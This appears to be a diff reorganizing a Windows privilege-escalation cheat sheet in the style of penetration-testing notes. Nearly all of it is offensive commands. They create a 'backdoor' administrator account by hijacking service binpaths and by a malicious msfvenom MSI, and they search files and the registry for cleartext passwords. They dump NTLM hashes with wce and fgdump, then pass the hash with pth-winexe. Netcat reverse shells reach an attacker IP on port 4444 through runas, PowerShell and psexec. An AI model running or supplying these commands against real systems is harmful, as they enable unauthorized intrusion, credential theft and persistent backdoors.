@@ -64,7 +64,7 @@ FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.tx
 
     You can process each service using cacls:
     *$ cacls "C:\path\to\file.exe"*
-    We are interested in services where we have BUILTIN\Users:(F) or (C) or (M) for our group. More info about permissions::
+    We are interested in services where we have BUILTIN\Users:(F) or (C) or (M) for our group. More info about permissions:
     *https://msdn.microsoft.com/en-us/library/bb727008.aspx*
 
     Transfer your binary (reverse shell/add your user to admin group).
@@ -97,7 +97,7 @@ $ accesschk.exe -qdws Users C:\Windows\*
     Then query the service using Windows sc:
     *$ sc qc <vulnerable service name>*
     Then change the binpath to execute your own commands (restart of the service will most likely be needed):
-    *$sc config <vuln-service> binpath= "net user backdoor backdoor123 /add"
+    *$ sc config <vuln-service> binpath= "net user backdoor backdoor123 /add"
 $ sc stop <vuln-service>
 $ sc start <vuln$ -service>
 $ sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add"
@@ -128,17 +128,9 @@ EoP2: Find unquoted paths
 
 EoP3: ClearText passwords (quick hits)
     Search for them
-    *$findstr /si password *.txt
+    *$ findstr /si password *.txt
 findstr /si password *.xml
 findstr /si password *.ini*
-    Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.
-    * $ cd /usr/share/windows-binaries/fgdump; python -m SimpleHTTPServer 80*
-    Download and run fgdump.exe on the target machine.
-    *$ pth-winexe -U DOMAIN/user%hash //$ip cmd*
-    or:
-    *export SMBHASH=xxx
-$ pth-winexe -U user%  //$ip cmd*
-
     Find all those strings in config files.
     *$dir /s *pass* == *cred* == *vnc* == *.config**
 
@@ -171,8 +163,33 @@ reg query HKCU /f password /t REG_SZ /s*
     *> post/windows/gather/credentials/gpp
     post/windows/gather/enum_unattend*
 
+EoP4: Pass the hash
+    Pass The Hash allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a cleartext password.
+    Hash dump
+    *wce32.exe -w
+wce64.exe -w
+fgdump.exe*
+    * $ cd /usr/share/windows-binaries/fgdump; python -m SimpleHTTPServer 80*
+    Download and run fgdump.exe on the target machine.
+    *$ pth-winexe -U DOMAIN/user%hash //$ip cmd*
+    or:
+    *export SMBHASH=xxx
+$ pth-winexe -U user%  //$ip cmd*
+    Windows hash format:
+    *user:group:id:ntlmpassword::*
+    You can do run as, with the hash:
+    Technique 1:
+    *C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"*
+    Technique 2:
+    *$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
+$computer = "<hostname>"
+[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)*
+    *$ powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1*
+    Technique 3:
+    *$ psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc <attacker_ip> 4444 -e cmd.exe"*
 
-EoP4: Services only available from loopback
+EoP5: Services only available from loopback
     You can find services bind to the loopback interface that are not reachable through the network running.look for LISTENING/LISTEN:
     *netstat -ano*
 
@@ -200,7 +217,7 @@ portfwd add -l 3306 -p 3306 -r 192.168.1.101*
     Compiling python scripts to executables:
     *$ wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py*
 
-EoP5: AlwaysInstallElevated
+EoP6: AlwaysInstallElevated
     AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.
 
     Check if these 2 registry values are set to "1":
@@ -210,7 +227,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 
     If they are, create your own malicious msi:
 
-    *$msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi*
+    *$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi*
 
     Then use msiexec on victim to execute your msi:
     *$ msiexec /quiet /qn /i C:\evil.msi*
@@ -219,15 +236,15 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
     *> use exploit/windows/local/always_install_elevated*
 
 
-EoP 6: Vulnerable drivers
+EoP 7: Vulnerable drivers
     Third party drivers might contain vulnerabilities, find them running:
     *$ DRIVERQUERY*
 
 
-EoP 7: Kernel vulnerabilities
+EoP 8: Kernel vulnerabilities
     Run exploit suggester against systeminfo:
-    *$https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
-    python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt*
+    *https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py*
+    *$ python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt*
     Find installed paths:
     *$ wmic qfe get Caption,Description,HotFixID,InstalledOn*
     *eDB   Vuln Name         MS#     2K       XP     2003    2008      Vista      7
@@ -317,7 +334,7 @@ Windows 8.1                    6.3.9600
 Windows 10                     10.0.10240*
 
 
-EoP8: Automated tools
+EoP9: Automated tools
 
     Powersploit
     *https://github.com/PowerShellMafia/PowerSploit
@@ -458,11 +475,6 @@ set PAYLOAD linux/x86/meterpreter/reverse_tcp*
     *getsystem
 hashdump*
 
-Pass the hash, hash dump
-    *wce32.exe -w
-wce64.exe -w
-fgdump.exe*
-
 Useful exploits
     Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:
     *https://www.exploit-db.com/exploits/6705/*
@@ -507,16 +519,3 @@ return 0;
     Run an arbitrary command:
     *echo -e '#include <stdio.h>\n#include <smain () {\nsystem("C:\\Users\\Administrator\\Desktop\\nc -lvp 4313 -e cmd.exe");\nreturn(0);\n}'> poc.c*
 
-Run as
-    Windows hash format:
-    *user:group:id:ntlmpassword::*
-    Technique 1:
-    *C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"*
-    Technique 2:
-    *$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
-$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
-$computer = "<hostname>"
-[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)*
-    *$ powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1*
-    Technique 3:
-    *$ psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc <attacker_ip> 4444 -e cmd.exe"*
